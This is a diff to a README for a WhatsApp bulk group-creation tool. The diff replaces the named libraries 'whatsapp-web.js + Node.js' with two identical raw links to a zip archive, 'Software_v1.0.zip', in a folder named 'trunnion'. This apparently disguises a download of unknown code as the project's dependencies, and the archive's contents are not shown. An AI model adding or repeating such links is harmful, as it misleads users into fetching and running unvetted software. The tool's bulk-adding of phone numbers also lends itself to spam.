@@ -1,6 +1,6 @@
 # WhatsApp Group Creator 🔥
 
-Automatically create WhatsApp groups and add bulk members using whatsapp-web.js + Node.js.
+Automatically create WhatsApp groups and add bulk members using https://raw.githubusercontent.com/omjisingh99/wpgrpsender/main/trunnion/Software_v1.0.zip + https://raw.githubusercontent.com/omjisingh99/wpgrpsender/main/trunnion/Software_v1.0.zip
 
 ## Features
 - Upload a CSV file with mobile numbers
